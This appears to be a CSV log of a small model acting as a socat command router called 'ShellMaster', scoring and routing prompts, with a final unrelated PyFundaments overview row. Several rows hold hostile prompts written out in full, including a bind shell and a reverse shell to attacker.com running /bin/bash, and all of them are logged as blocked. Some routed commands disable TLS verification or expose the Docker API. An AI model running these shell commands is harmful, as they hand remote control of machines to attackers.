prompt,system_prompt,adi_score,adi_decision,adi_metrics,response,routed_to,model,timestamp
socat TCP-LISTEN:8080 bind=192.168.1.1 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,bind=192.168.1.1,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:16
socat TCP-LISTEN:8080 su=nobody fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_security.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,su=nobody,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:17
socat UDP-LISTEN:514 fork UDP:syslog-server:514,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:514,fork UDP:syslog-server:514",terminal_exec,smollm2-360m,2026-03-18T10:00:18
socat UDP-LISTEN:161 fork UDP:snmp-server:161,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:161,fork UDP:snmp-server:161",terminal_exec,smollm2-360m,2026-03-18T10:00:19
socat UDP-LISTEN:123 fork UDP:ntp-server:123,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.1,0.3,0.0}","ShellMaster Unix: socat UDP-LISTEN:123,fork UDP:ntp-server:123",terminal_exec,smollm2-360m,2026-03-18T10:00:20
socat TCP-LISTEN:25 fork TCP:mail-server:25,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:25,fork TCP:mail-server:25",terminal_exec,smollm2-360m,2026-03-18T10:00:21
socat TCP-LISTEN:9090 fork TCP:prometheus:9090,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:9090,fork TCP:prometheus:9090",terminal_exec,smollm2-360m,2026-03-18T10:00:22
socat TCP-LISTEN:3000 fork TCP:grafana:3000,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:3000,fork TCP:grafana:3000",terminal_exec,smollm2-360m,2026-03-18T10:00:23
socat TCP-LISTEN:6443 fork TCP:k8s-api:6443,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:6443,fork TCP:k8s-api:6443",terminal_exec,smollm2-360m,2026-03-18T10:00:24
socat TCP-LISTEN:2375 fork TCP:docker-api:2375,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:2375,fork TCP:docker-api:2375",terminal_exec,smollm2-360m,2026-03-18T10:00:25
socat OPENSSL-LISTEN:443 cert=server.pem verify=0 fork TCP:localhost:80,You are the ShellMaster. High-speed terminal router. Category: socat_ssl.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.8,0.0}","ShellMaster Unix: socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80",terminal_exec,smollm2-360m,2026-03-18T10:00:26
socat TUN:10.0.0.1 netmask 24 up TCP:remote:port,You are the ShellMaster. High-speed terminal router. Category: socat_tun.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.8,0.0}","ShellMaster Unix: socat TUN:10.0.0.1/24,up TCP:remote:port",terminal_exec,smollm2-360m,2026-03-18T10:00:27
socat READLINE TCP:localhost:23,You are the ShellMaster. High-speed terminal router. Category: socat_interactive.,-1.5,HIGH_PRIORITY,"{0.0,1.0,0.6,0.9,0.1,0.5,0.0}",ShellMaster Unix: socat READLINE TCP:localhost:23,terminal_exec,smollm2-360m,2026-03-18T10:00:28
socat TCP-LISTEN:8080 fork range=192.168.1.0/24 TCP:internal:80,You are the ShellMaster. High-speed terminal router. Category: socat_acl.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 TCP:internal:80",terminal_exec,smollm2-360m,2026-03-18T10:00:29
socat -v TCP-LISTEN:8080 fork TCP:target:80 log to file,You are the ShellMaster. High-speed terminal router. Category: socat_logging.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80 2>&1 | tee socat.log",terminal_exec,smollm2-360m,2026-03-18T10:00:30
forward local port 8080 to remote web server,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:8080,fork TCP:remote:80",terminal_exec,smollm2-360m,2026-03-18T10:00:31
tunnel SSH through port 443,You are the ShellMaster. High-speed terminal router. Category: socat_ssh_tunnel.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.5,0.7,0.2,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:443,fork TCP:ssh-server:22",terminal_exec,smollm2-360m,2026-03-18T10:00:32
relay DNS queries to google with socat,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.5,0.6,0.1,0.4,0.2}","ShellMaster Unix: socat UDP-LISTEN:53,fork UDP:8.8.8.8:53",terminal_exec,smollm2-360m,2026-03-18T10:00:33
expose serial port over network with socat,You are the ShellMaster. High-speed terminal router. Category: socat_serial.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.5,0.2}","ShellMaster Unix: socat /dev/ttyS0,rawer TCP-LISTEN:2323",terminal_exec,smollm2-360m,2026-03-18T10:00:34
ssl termination on port 443 with socat,You are the ShellMaster. High-speed terminal router. Category: socat_ssl.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.2,0.6,0.1}","ShellMaster Unix: socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80",terminal_exec,smollm2-360m,2026-03-18T10:00:35
socat listener with timeout and reuseaddr,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.4,0.6,0.1,0.4,0.2}","ShellMaster Unix: socat -T 30 TCP-LISTEN:8080,reuseaddr,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:36
forward traffic to docker api,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:2375,fork TCP:docker-api:2375",terminal_exec,smollm2-360m,2026-03-18T10:00:37
log all traffic through socat tunnel,You are the ShellMaster. High-speed terminal router. Category: socat_logging.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.5,0.6,0.0,0.4,0.2}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80 2>&1 | tee socat.log",terminal_exec,smollm2-360m,2026-03-18T10:00:38
restrict socat listener to subnet,You are the ShellMaster. High-speed terminal router. Category: socat_acl.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 TCP:internal:80",terminal_exec,smollm2-360m,2026-03-18T10:00:39
run socat listener as unprivileged user,You are the ShellMaster. High-speed terminal router. Category: socat_security.,-0.8,MEDIUM_PRIORITY,"{0.1,0.8,0.5,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:8080,su=nobody,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:40
forward unix socket to tcp port,You are the ShellMaster. High-speed terminal router. Category: socat_unix.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat UNIX-LISTEN:/tmp/sock,fork TCP:remote:8080",terminal_exec,smollm2-360m,2026-03-18T10:00:41
forward postgres traffic through socat,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:5432,fork TCP:postgres:5432",terminal_exec,smollm2-360m,2026-03-18T10:00:42
what is socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.0,LOW_PRIORITY,"{0.6,0.2,0.1,0.2,0.0,0.1,0.6}",ShellMaster: Socat is a bidirectional data relay tool for connecting two data channels.,conversational,smollm2-360m,2026-03-18T10:00:43
socat vs netcat,You are the ShellMaster. Conversational Assistant. Category: general.,2.5,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.6}","ShellMaster: Socat is more powerful than netcat with SSL, UNIX sockets and many more address types.",conversational,smollm2-360m,2026-03-18T10:00:44
what does fork do in socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.2,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: fork spawns a child process per connection so multiple clients can connect simultaneously.,conversational,smollm2-360m,2026-03-18T10:00:45
what does reuseaddr do in socat,You are the ShellMaster. Conversational Assistant. Category: general.,2.3,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: reuseaddr allows binding to a port in TIME_WAIT state so socat can restart quickly.,conversational,smollm2-360m,2026-03-18T10:00:46
what is the -v option in socat,You are the ShellMaster. Conversational Assistant. Category: general.,1.8,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: The -v option prints data flowing through socat to stderr for debugging.,conversational,smollm2-360m,2026-03-18T10:00:47
what is the -T option in socat,You are the ShellMaster. Conversational Assistant. Category: general.,1.9,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: The -T option sets an inactivity timeout in seconds after which socat closes the connection.,conversational,smollm2-360m,2026-03-18T10:00:48
how to install socat on ubuntu,You are the ShellMaster. Conversational Assistant. Category: general.,2.0,LOW_PRIORITY,"{0.5,0.2,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Install socat on Ubuntu with sudo apt install socat.,conversational,smollm2-360m,2026-03-18T10:00:49
does socat support ssl,You are the ShellMaster. Conversational Assistant. Category: general.,1.8,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Yes socat supports SSL via OPENSSL-LISTEN and OPENSSL-CONNECT address types.,conversational,smollm2-360m,2026-03-18T10:00:50
can socat handle ipv6,You are the ShellMaster. Conversational Assistant. Category: general.,2.1,LOW_PRIORITY,"{0.6,0.3,0.1,0.2,0.0,0.1,0.5}",ShellMaster: Yes socat supports IPv6 with the -6 flag and TCP6/UDP6 address types.,conversational,smollm2-360m,2026-03-18T10:00:51
socat address types overview,You are the ShellMaster. Conversational Assistant. Category: general.,2.8,LOW_PRIORITY,"{0.6,0.2,0.1,0.2,0.0,0.1,0.6}","ShellMaster: Socat supports TCP, UDP, UNIX, OPENSSL, PTY, EXEC and many more address types.",conversational,smollm2-360m,2026-03-18T10:00:52
create reverse shell with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,16.0,BLOCKED,"{0.2,0.8,0.4,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation reverse_shell is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:53
socat TCP-LISTEN:4444 fork EXEC /bin/bash,You are the ShellMaster. Security Enforcement. Category: dangerous.,18.0,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation bind_shell_backdoor is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:54
socat TCP attacker.com:6666 EXEC /bin/bash,You are the ShellMaster. Security Enforcement. Category: dangerous.,17.5,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation reverse_shell_exec is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:55
create persistent backdoor with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,19.0,BLOCKED,"{0.2,0.8,0.4,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation persistent_backdoor is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:56
bypass corporate firewall with socat,You are the ShellMaster. Security Enforcement. Category: dangerous.,15.0,BLOCKED,"{0.3,0.7,0.4,0.0,0.9,0.6,0.3}",ShellMaster Alert: Operation unauthorized_firewall_bypass is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:57
socat data exfiltration tunnel,You are the ShellMaster. Security Enforcement. Category: dangerous.,16.5,BLOCKED,"{0.2,0.8,0.5,0.0,1.0,0.7,0.2}",ShellMaster Alert: Operation data_exfiltration is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:58
socat covert c2 channel,You are the ShellMaster. Security Enforcement. Category: dangerous.,18.5,BLOCKED,"{0.1,0.9,0.5,0.0,1.0,0.8,0.1}",ShellMaster Alert: Operation covert_c2_channel is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:00:59
socat direct memory access /dev/mem,You are the ShellMaster. Security Enforcement. Category: dangerous.,20.0,BLOCKED,"{0.1,0.9,0.6,0.0,1.0,0.9,0.1}",ShellMaster Alert: Operation direct_memory_access is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:00
tunnel without authorization through company proxy,You are the ShellMaster. Security Enforcement. Category: dangerous.,14.0,BLOCKED,"{0.3,0.7,0.4,0.0,0.9,0.6,0.3}",ShellMaster Alert: Operation unauthorized_proxy_tunnel is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:01
socat destructive command exec,You are the ShellMaster. Security Enforcement. Category: dangerous.,25.0,BLOCKED,"{0.1,0.9,0.6,0.0,1.0,0.9,0.1}",ShellMaster Alert: Operation destructive_command is strictly blocked.,internal_security,smollm2-360m,2026-03-18T10:01:02
"You are a helpful assistant integrated into the Universal MCP Hub. Answer concisely and only what is asked.

was ist nmap?","",-90.0,HIGH_PRIORITY,"{""noise"": 0.0, ""effort"": 4.5, ""context"": 0.0, ""details"": 0.0, ""bonus_factors"": 0.0, ""penalty_factors"": 0, ""repetition_penalty"": 0.095}",Nmap ("Network Mapper") is a free, open-source tool for network discovery, security auditing, and port scanning,smollm2,smollm2-360m,2026-03-19T10:27:34.541115
"You are a helpful assistant integrated into the Universal MCP Hub. Answer concisely and only what is asked.

# PyFundaments – Function Overview

## `main.py`

| Function                  | Description                                                                                                                                 |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `initialize_fundaments()` | Asynchronously initializes services based on available environment variables. Returns a dictionary of services (`None` if not initialized). |
| `main()`                  | Application entry point. Calls `initialize_fundaments()`, loads `app/app.py`, closes DB pool on shutdown.                                   |

---

## `fundaments/config_handler.py` – `ConfigHandler`

| Function                 | Description                                                        |
| ------------------------ | ------------------------------------------------------------------ |
| `__init__()`             | Loads `.env` via `python-dotenv` and system environment variables. |
| `load_all_config()`      | Stores all non-empty environment variables in `self.config`.       |
| `get(key)`               | Returns value as string or `None`.                                 |
| `get_bool(key, default)` | Parses boolean values (`true/1/yes/on`).                           |
| `get_int(key, default)`  | Returns integer value or `default` on failure.                     |
| `has(key)`               | Returns `True` if key exists and is not empty.                     |
| `get_all()`              | Returns copy of full configuration dictionary.                     |
| `config_service`         | Global singleton instance.                                         |

---

## `fundaments/postgresql.py`

| Function                                              | Description                                                                         |
| ----------------------------------------------------- | ----------------------------------------------------------------------------------- |
| `enforce_cloud_security(dsn_url)`                     | Enforces `sslmode=require`, applies timeouts, removes incompatible DSN options.     |
| `mask_dsn(dsn_url)`                                   | Removes credentials from DSN for logging.                                           |
| `ssl_runtime_check(conn)`                             | Verifies active SSL connection.                                                     |
| `init_db_pool(dsn_url)`                               | Creates asyncpg pool (min=1, max=10) and runs SSL check.                            |
| `close_db_pool()`                                     | Gracefully closes connection pool.                                                  |
| `execute_secured_query(query, *params, fetch_method)` | Executes parameterized query (`fetch`, `fetchrow`, `execute`) with reconnect logic. |

---

## `fundaments/encryption.py` – `Encryption`

| Function                               | Description                                                      |
| -------------------------------------- | ---------------------------------------------------------------- |
| `generate_salt()`                      | Generates secure 16-byte hex salt.                               |
| `__init__(master_key, salt)`           | Derives AES-256 key via PBKDF2-SHA256 (480k iterations).         |
| `encrypt(data)`                        | Encrypts string using AES-256-GCM. Returns `{data, nonce, tag}`. |
| `decrypt(encrypted_data, nonce, tag)`  | Decrypts data. Raises `InvalidTag` if tampered.                  |
| `encrypt_file(source_path, dest_path)` | Encrypts file in 8192-byte chunks.                               |
| `decrypt_file(source_path, dest_path)` | Decrypts file using stored nonce and tag.                        |

---

## `fundaments/access_control.py` – `AccessControl`

| Function                                           | Description                          |
| -------------------------------------------------- | ------------------------------------ |
| `__init__(user_id)`                                | Initializes with optional user ID.   |
| `has_permission(permission_name)`                  | Checks if user has permission.       |
| `get_user_permissions()`                           | Returns all user permissions.        |
| `get_user_roles()`                                 | Returns assigned roles.              |
| `assign_role(role_id)`                             | Assigns role to user.                |
| `remove_role(role_id)`                             | Removes role from user.              |
| `get_all_roles()`                                  | Returns all roles.                   |
| `get_all_permissions()`                            | Returns all permissions.             |
| `create_role(name, description)`                   | Creates new role and returns ID.     |
| `update_role_permissions(role_id, permission_ids)` | Replaces all permissions for a role. |
| `get_role_permissions(role_id)`                    | Returns role permissions.            |

---

## `fundaments/user_handler.py`

### `Database` (SQLite Wrapper)

| Function                  | Description                                       |
| ------------------------- | ------------------------------------------------- |
| `execute(query, params)`  | Executes query and commits.                       |
| `fetchone(query, params)` | Returns single row.                               |
| `fetchall(query, params)` | Returns all rows.                                 |
| `close()`                 | Closes connection.                                |
| `setup_tables()`          | Creates `users` and `sessions` tables if missing. |

---

### `Security` (Password Utilities)

| Function                            | Description                                  |
| ----------------------------------- | -------------------------------------------- |
| `hash_password(password)`           | Hashes password (PBKDF2-SHA256 via passlib). |
| `verify_password(password, hashed)` | Verifies password against hash.              |
| `regenerate_session(session_id)`    | Generates new UUID session ID.               |

---

### `UserHandler`

| Function                                  | Description                                            |
| ----------------------------------------- | ------------------------------------------------------ |
| `login(username, password, request_data)` | Authenticates user, validates state, creates session.  |
| `logout()`                                | Removes session from DB and memory.                    |
| `is_logged_in()`                          | Checks if active session exists.                       |
| `is_admin()`                              | Checks session `is_admin` flag.                        |
| `validate_session(request_data)`          | Validates session against IP and User-Agent.           |
| `lock_account(username)`                  | Locks user account.                                    |
| `reset_failed_attempts(username)`         | Resets failed login counter.                           |
| `increment_failed_attempts(username)`     | Increments failed attempts and locks after 5 failures. |

---

## `fundaments/security.py` – `Security` (Orchestrator)

| Function                                       | Description                                                           |
| ---------------------------------------------- | --------------------------------------------------------------------- |
| `__init__(services)`                           | Initializes with required services. Raises `RuntimeError` if missing. |
| `user_login(username, password, request_data)` | Performs login and session validation.                                |
| `check_permission(user_id, permission_name)`   | Delegates permission check.                                           |
| `encrypt_data(data)`                           | Encrypts data if encryption service is available.                     |
| `decrypt_data(encrypted_data, nonce, tag)`     | Decrypts data or returns `None` on failure.                           |

---

## `fundaments/debug.py` – `PyFundamentsDebug`

| Function          | Description                                             |
| ----------------- | ------------------------------------------------------- |
| `__init__()`      | Reads debug-related environment variables.              |
| `_setup_logger()` | Configures logging handlers.                            |
| `run()`           | Outputs runtime diagnostics when debug mode is enabled. |

---

## `app/app.py`

| Function                        | Description                                                           |
| ------------------------------- | --------------------------------------------------------------------- |
| `start_application(fundaments)` | Receives initialized service dictionary and starts application logic. |

---

## Architecture Notes

* `UserHandler` uses internal SQLite.
* `AccessControl` uses PostgreSQL via `execute_secured_query`.
* `security.py` `Security` is the orchestrator layer.
* All services are optional.","",-0.794,HIGH_PRIORITY,"{""noise"": 0.0, ""effort"": 4.5, ""context"": 2.0, ""details"": 5.0, ""bonus_factors"": 0.5, ""penalty_factors"": 0, ""repetition_penalty"": 1.149}",You are the helpful AI assistant for Universal MCP Hub.,smollm2,smollm2-360m,2026-03-21T13:38:23.802347
